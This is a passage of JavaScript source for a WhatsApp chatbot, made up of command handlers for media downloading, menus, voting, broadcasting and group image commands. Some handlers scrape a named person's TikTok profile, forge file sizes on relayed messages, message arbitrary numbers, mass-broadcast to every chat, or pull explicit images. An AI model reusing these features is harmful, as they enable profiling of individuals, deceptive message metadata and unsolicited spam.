                    get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/asupan/asupanghea?apikey=${dapapi}`)
                    ggg = `Intake`
   sendButVideo(from, ggg, `Click Next To Continue`, get_result, [                      
          {
            buttonId: `ghea`,
            buttonText: {
              displayText: `Next シ︎`,
            },
            type: 1,
          },
        ]);                 
                    break    
case 'size':
if (args.length < 1) return reply('Enter the numbers')
filsize = args[0]
costick = await xeon.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:fgif})
xeon.relayWAMessage(costick)
break

case 'sizeimg':
if (args.length < 1) return reply('Enter the numbers')
filsizei = args[0]
costick3 = await xeon.prepareMessageFromContent(from,{
"imageMessage": {
	"url": m.quoted.url,
	"mimetype": m.quoted.mimetype,
	"caption": m.quoted.caption,
	"fileSha256": m.quoted.fileSha256.toString('base64'),
	"fileLength": filsizei,
	"height": m.quoted.height,
	"width": m.quoted.width,
	"mediaKey": m.quoted.mediaKey.low,
	"jpegThumbnail": m.quoted.jpegThumbnail
}
}, {quoted:ftroli})
xeon.relayWAMessage(costick3)
break
      case "Rentbot":
        if (!mek.key.fromMe) return reply("Cant be a rentbot in a bot");
        jadibot(reply, xeon, from);
        break;
      case "stoprentbot":
        if (!mek.key.fromMe)
          return reply("cant stop being bot except the owner");
        stopjadibot(reply);
        break;
      case "listbot":
        let tekss = "「 *LIST RENTBOT* 」\n";
        for (let i of listjadibot) {
          tekss += `*Number* : ${i.jid.split("@")[0]}
*Name* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`;
        }
        reply(tekss);
        break;

      //------------------< Fitur yg pake button >-------------------
      
	case 'chat':
			if (args[0].startsWith('08')) return reply('Prefix number with 91')
            if (args[0].startsWith('+62')) return reply('Prefix number with 91')
			if (args.length < 1) return reply(`Usage ${prefix}chat 91xnxx|teks`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            xeon.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
case 'viewonce':
res = await xeon.prepareMessageFromContent(from,{
"viewOnceMessage": {
"message": {
"imageMessage": {
"mimetype": 'image/jpeg',
"jpegThumbnail": iye,
"viewOnce": true
}
}
}
}, {}) 
xeon.relayWAMessage(res)
break
case 'hbd': case 'zodiak': case 'zodiac':
let textus = args.join(" ")
if (!q) return reply(`Example : ${prefix + command} 2003 01 24`)
const zodiak = [
    ["Capricorn",   new Date(1970, 0, 1)],
    ["Aquarius",    new Date(1970, 0, 20)],
    ["Pisces",      new Date(1970, 1, 19)],
    ["Aries",       new Date(1970, 2, 21)],
    ["Taurus",      new Date(1970, 3, 21)],
    ["Gemini",      new Date(1970, 4, 21)],
    ["Cancer",      new Date(1970, 5, 22)],
    ["Leo",         new Date(1970, 6, 23)],
    ["Virgo",       new Date(1970, 7, 23)],
    ["Libra",       new Date(1970, 8, 23)],
    ["Scorpio",     new Date(1970, 9, 23)],
    ["Sagittarius", new Date(1970, 10, 22)],
    ["Capricorn",   new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
const okbg = new Date(textus)
if (okbg == 'Invalid Date') throw date
const d = new Date()
const [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
const birth = [okbg.getFullYear(), okbg.getMonth() + 1, okbg.getDate()]
    
const zodiac = getZodiac(birth[1], birth[2])
const ageD = new Date(d - date)
const age = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()

const birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
const cekusia = bulan === birth[1] && tanggal === birth[2] ? `Happy -${age}th Birthday 🥳🎉` : age

const teksh = `
Birth : ${birth.join('-')}
Upcoming hbd : ${birthday.join('-')}
Age : ${cekusia}
Zodiac : ${zodiac}
`.trim()
reply(monospace(teksh))
break
// debug
  case 'debug':
			 res = await xeon.prepareMessageFromContent(from,{
"templateMessage": {
						"hydratedTemplate": {
							"hydratedContentText": `Hi ${pushname} 👋`,
							"hydratedFooterText": `${fakeyoi}`,
							"hydratedButtons": [
								{
									"quickReplyButton": {
										"displayText": "List Menu",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 0
								},
								{
									"quickReplyButton": {
										"displayText": "Script",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 1
								},
								{
									"quickReplyButton": {
										"displayText": "Instagram",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 2
								}
							]
						}
					}
				}, {}) 
xeon.relayWAMessage(res)
break
case 'debug2':
   res = await xeon.prepareMessageFromContent(from,{
"templateMessage": {
  "hydratedFourRowTemplate": {
    "hydratedContentText": "",
    "hydratedFooterText": "",
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": "",
          "url": ""
        },
        "index": 0
      }
    ]
  },
  "hydratedTemplate": {
    "hydratedContentText": `Hi ${pushname} 👋,\n\n${jam} - ${week} ${weton} - ${date}`,
    "hydratedFooterText": `${fakeyoi}`,
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": `Script ${fakeyoi}`,
          "url": "╭─➤ *ᴘᴇᴘᴇ sɪʀ*\n│       ❑  *sᴄʀɪᴘᴛ*\n│❖   ɢɪᴛʜᴜʙ:\n│❖   https://github.com/jacksir/jack-SIR\n│❖   ʏᴏᴜᴛᴜʙᴇ:\n│❖   https://youtube.com/channel/UCVJ9029PQ-gJBtFQZZ3AJuA\n╰────────────────❋ཻུ۪۪⸙\n\n⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘\n             ᴘᴇᴘᴇ sɪʀ\n\n╭◪ *ᴄᴏᴅᴅᴇᴅ ʙʏ ᴘᴇᴘᴇ*\n╰─────────────────❋ཻུ۪۪⸙"
        },
        "index": 0
      }
    ]
  }
}
}, {})
xeon.relayWAMessage(res)
break
			
              
                 break
			      case "mode":
        if (!mek.key.fromMe) return;
        sendButMessage(from, `MODE SELF/PUBLIC`, `Please choose one`, [
          {
            buttonId: `self`,
            buttonText: {
              displayText: `SELF MODE`,
            },
            type: 1,
          },
          {
            buttonId: `public`,
            buttonText: {
              displayText: `PUBLIC MODE`,
            },
            type: 1,
          },
        ]);
        break;
case "intake": // by jack
        sendButMessage(from, `Hi ${pushname}`, `Please select your intake✨`, [
          {
            buttonId: `+91`,
            buttonText: {
              displayText: `❑  +91 intake`,
            },
            type: 1,
          },
          {
            buttonId: `ghea`,
            buttonText: {
              displayText: `🔖 Ghea intake`,
            },
            type: 1,
          },
          {
            buttonId: `intake2`,
            buttonText: {
              displayText: `Next intake >`,
            },
            type: 1,
          },
        ]);
        break;
case "intake2": // by jack
        sendButMessage(from, `Hi ${pushname}`, `Please select the intake V.2✨`, [
          {
            buttonId: `santuy`,
            buttonText: {
              displayText: `🔖 Intake of Santuy`,
            },
            type: 1,
          },
          {
            buttonId: `leaky`,
            buttonText: {
              displayText: `🔖 Leaky intake`,
            },
            type: 1,
          },
          {
            buttonId: `intake3`,
            buttonText: {
              displayText: `Next Intake >`,
            },
            type: 1,
          },
        ]);
        break;
case "intake3": // by jack
        sendButMessage(from, `Hi ${pushname}`, `Please select the intake V.3✨`, [
          {
            buttonId: `rikagusriani`,
            buttonText: {
              displayText: `🔖 Rikagusriani intake`,
            },
            type: 1,
          },
          {
            buttonId: `ukhti`,
            buttonText: {
              displayText: `🔖 Ukhti intake`,
            },
            type: 1,
          },
          {
            buttonId: `mygithub`,
            buttonText: {
              displayText: `Follow my Github 😄`,
            },
            type: 1,
          },
        ]);
        break;

      //end
      //------------------< Fitur downloader >-------------------
      case "tiktok":
        if (!isUrl(args[0]) && !args[0].includes("tiktok.com"))
          return reply(mess.Iv);
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/tiktok/nowatermark?url=${args[0]}`
        );
        var b = bv.result.author_metadata;
        var tamnel = await getBuffer(
          bv.result.media_resources.image.contentUrl
        );
        var a = bv.result.media_metadata;
        sendButImage(
          from,
          `⚜️ *Nickname*: ${b.username}\n❤️ *Like*: ${a.stats.diggCount}\n💬 *Comment*: ${a.stats.commentCount}\n🔁 *Share*: ${a.stats.shareCount}\n🎞️ *Views*: ${a.stats.playCount}`,
          `Please choose the one format you want to download`,
          tamnel,
          [
            {
              buttonId: `tiktokdl ${args[0]}|video`,
              buttonText: {
                displayText: `VIDEO`,
              },
              type: 1,
            },
            {
              buttonId: `tiktokdl ${args[0]}|audio`,
              buttonText: {
                displayText: `AUDIO`,
              },
              type: 1,
            },
          ]
        );
        break;

     
      //JCCHCCGHTHDTRSRS
      case "twitter":
        if (!isUrl(args[0]) && !args[0].includes("twitter.com"))
          return reply(mess.Iv);
        if (!q) return fakegroup("The link?");
        ten = args[0];
        var res = await hx.twitter(`${ten}`);
        ren = `${g.HD}`;
        sendMediaURL(from, ren, "DONE");
        break;
      case "facebook":
        if (!q) return reply("The link?");
        if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
          return reply(mess.Iv);
        reply(mess.wait);
        te = args.join(" ");
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        break;
      case "instagram":
        if (!isUrl(args[0]) && !args[0].includes("instagram.com"))
          return reply(mess.Iv);
        if (!q) return fakegroup("The link?");
        reply(mess.wait);
        hx.igdl(args[0]).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes("mp4")) {
              let link = await getBuffer(i.url);
              xeon.sendMessage(from, link, video, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              xeon.sendMessage(from, link, image, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        break;
      case "tiktokdl":
        var gh = args.join("");
        var link = gh.split("|")[0];
        var tipe = gh.split("|")[1];
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/tiktok/nowatermark?url=${link}`
        );
        if (tipe == "audio") {
          sendMediaURL(from, bv.result.media_resources.music.playUrl, "");
        }
        if (tipe == "video") {
          sendMediaURL(from, bv.result.media_resources.video.videoUrl, "");
        }
        break;
case 'setprefix':
      if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
       if (args.length < 1) return reply(`Enter prefix\nOptions :\n=> multi\n=> nopref`)
           if (c === 'multi'){
              multi = true
                    reply(`Successfully changed prefix to ${c}`)
                } else if (c === 'nopref'){
                    multi = false
                    nopref = true
                    reply(`Successfully changed prefix to ${c}`)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${c}`
                    reply(`Successfully changed prefix to ${c}`)
                }
                break
      
      case "delvote":
        if (!mek.key.remoteJid) return;
        if (isVote) return reply("No Voting session");
        delVote(from);
        reply("Successfully Deleting Voting Session In This Group");
        break;
      case "voting":
        if (!isGroupAdmins && !mek.key.fromMe) return;
        if (!isGroup) return reply('this feature is only for groups');
        if (isVote) return reply("Voting Session In Progress In This Group");
        if (!q)
          return reply(
            "*Voting*\n\n" +
              prefix +
              "voting @tag target | reason  | 1 (1 = 1 Minute)"
          );
        if (
          mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 ||
          mek.message.extendedTextMessage.contextInfo == null
        ) {
          let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
          split = args.join(" ").replace("@", "").split("|");
          if (!Number(split[2]))
            return reply(
              "enter number in row 3\nExample: 1-9999\n1 = 1 Min"
            );
          await mentions(
            "Vote " +
              "@" +
              id.split("@")[0] +
              " On Start" +
              "\n\n" +
              `vote = ✅\ndevote = ❌\n\nReason: ${split[1]}`,
            [id],
            true
          );
          addVote(from, split[1], split[0], split[2], reply);
        }
        break;
      case "linkwa":
        if (!q) return reply("what group are you looking for??");
        hx.linkwa(q).then((result) => {
          let res = "*「 _LINK WA_ 」*\n\n";
          for (let i of result) {
            res += `*Name*: *${i.nama}\n*Link*: ${i.link}\n\n`;
          }
          reply(res);
        });
        break;
     /* case "igstalk":
        if (!q) return reply("Username?");
        const tod = await fetchJson(
          `https://api.dhnjing.xyz/stalk/instagram?user=${q}`
        );
        buff = await getBuffer(tod.result.user_profile_hd);
        const tt = `*INSTAGRAM STALK*
    Username: ${tod.result.username}
    Fullname: ${tod.result.user_fullname}
    Bio: ${tod.result.user_bio}

    Jumlah postingan: ${tod.result.user_post_total}
    Following: ${tod.result.user_following}
    Follower: ${tod.result.user_followers}`;
        xeon.sendMessage(from, buff, image, { quoted: mek, caption: tt });
        break;*/
      
      case "tiktokstalk":
        if (!q) return reply("Username? ");
        var i = await fetchJson(
          `https://api.dhnjing.xyz/stalk/tiktok?user=@${q}`
        );
        buff = await getBuffer(i.result.user.avatarLarger);
        var ii = `*TIKTOK STALK*
    Username: ${q}
    Nickname: ${i.result.user.nickname}
    Bio: ${i.result.user.signature}

    Number of posts: ${i.result.stats.videoCount}
    Following: ${i.result.stats.followingCount}
    Follower: ${i.result.stats.followerCount}`;
        xeon.sendMessage(from, buff, image, { quoted: mek, caption: ii });
        break;
   
  case 'writebook':            
            if (args.length == 0) return reply(`example: ${prefix + command} Xeon`)
            reply(mess.wait)
            teks = args.join(" ")
            ini_buf = await getBuffer(`https://xeon.herokuapp.com/api/maker/nulis?apikey=${valkey}&text=${teks}`)  
buttons = [{buttonId: `writelist`,buttonText:{displayText: `Write List🔖`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(ini_buf, "imageMessage", { thumbnail: ini_buf, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              xeon.relayWAMessage(prep)
         
            break
		case 'write':
              
                if (args.length < 1) return reply(`where is the text bro??\nexample ${prefix + command} ${pushname}`)
                dpuhy = args.join(' ')
               tiyo = `Please choose one`
sendButMessage(from, tiyo, `𝙿𝙴𝙿𝙴 𝚂𝙸𝚁`, [
            {              
              buttonId: `writedown ${dpuhy}`,
              buttonText: {
                displayText: `DOWN`,
              },
              type: 1,
               },
          {
            buttonId: `writeleft ${dpuhy}`,
            buttonText: {
              displayText: `LEFT`,
            },
            type: 1,          
          },
        ]);               
        break;                 
   case 'bc':
      case 'broadcast':
        if (!mek.key.fromMe) return;
             if (!isOwner) return  reply(mess.only.owner)
             if (args.length < 1) return reply('text?')
             anu = await xeon.chats.all()
             if (isMedia && !mek.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             bc = await xeon.downloadMediaMessage(encmedia)
             for (let _ of anu) {
             xeon.sendMessage(_.jid, bc, image, {quoted:fkontak,caption: `*「 𝙿𝙴𝙿𝙴 𝚂𝙸𝚁 BROADCASTING 」*\n\n${body.slice(4)}`})
}
             reply('Broadcast success')
             } else {
             for (let _ of anu) {
xeon.sendMessage(_.jid, 
			{"contentText": `*「 BROADCAST 」*\n\n${body.slice(4)}`,
			"footerText": '𝙿𝙴𝙿𝙴 𝚂𝙸𝚁',
			"buttons": [
			{"buttonId": `${prefix}allmenu`,
			"buttonText": {"displayText": "CLICK TO VIEW MENU"
			},"type": "RESPONSE"}
			], "headerType": 1,
			}, MessageType.buttonsMessage )
}
             reply('Broadcast success')
}
             break

case 'yuri':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=yuri&apikey=${hardi}`)
buttons = [{buttonId: `yuri`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              xeon.relayWAMessage(prep)
break
case 'anal':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
aku = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=anal&apikey=${hardi}`)
buttons = [{buttonId: `anal`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(aku, "imageMessage", { thumbnail: aku, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              xeon.relayWAMessage(prep)
break
case 'lesbian':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
kau = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=lesbian&apikey=${hardi}`)
buttons = [{buttonId: `lesbian`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(kau, "imageMessage", { thumbnail: kau, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              xeon.relayWAMessage(prep)
break
case 'eroneko':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=eroNeko&apikey=${hardi}`)
buttons = [{buttonId: `eroneko`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              xeon.relayWAMessage(prep)
break
case 'bj':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
yoiz = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=bJ&apikey=${hardi}`)
buttons = [{buttonId: `bj`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              xeon.relayWAMessage(prep)
break
case 'kitsune':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=kitsune&apikey=${hardi}`)
buttons = [{buttonId: `kitsune`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              xeon.relayWAMessage(prep)
break
case 'pussy':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=pussy&apikey=${hardi}`)
buttons = [{buttonId: `pussy`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              xeon.relayWAMessage(prep)
break
case 'wallpaper':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=wallpaper&apikey=${hardi}`)
buttons = [{buttonId: `wallpaper`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              xeon.relayWAMessage(prep)
break
case 'neko2':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=${hardi}`)
buttons = [{buttonId: `neko2`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              xeon.relayWAMessage(prep)
break
case 'baka':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=baka&apikey=${hardi}`)
buttons = [{buttonId: `baka`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              xeon.relayWAMessage(prep)
break
case 'slap':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=slap&apikey=${hardi}`)
buttons = [{buttonId: `slap`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              xeon.relayWAMessage(prep)
break
case 'poke':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=poke&apikey=${hardi}`)
buttons = [{buttonId: `poke`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              xeon.relayWAMessage(prep)
break
case 'keta':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=keta&apikey=${hardi}`)
buttons = [{buttonId: `keta`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              xeon.relayWAMessage(prep)
break
case  'awoo':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
buffer = await getBuffer(anu.url)
xeon.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
break
case  'blowjob':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
buffer = await getBuffer(anu.url)
xeon.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
break
case  'hentai': 
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
xeon.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
break
case  'megumin':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
buffer = await getBuffer(anu.url)
xeon.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
break
case  'neko':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
xeon.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
break
case  'trapnime':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
buffer = await getBuffer(anu.url)
xeon.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
break
//Done
case 'writeleft':
if (!c) return reply('Where is the text bro??')
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/nuliskiri?text=${c}&apikey=${hardi}`)
buttons = [{buttonId: `writeleft`,buttonText:{displayText: `Write List🔖`},type:1}]
              imageMsg = (await xeon.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'𝙿𝙴𝙿𝙴 𝚂𝙸𝚁', imageMessage: imageMsg,
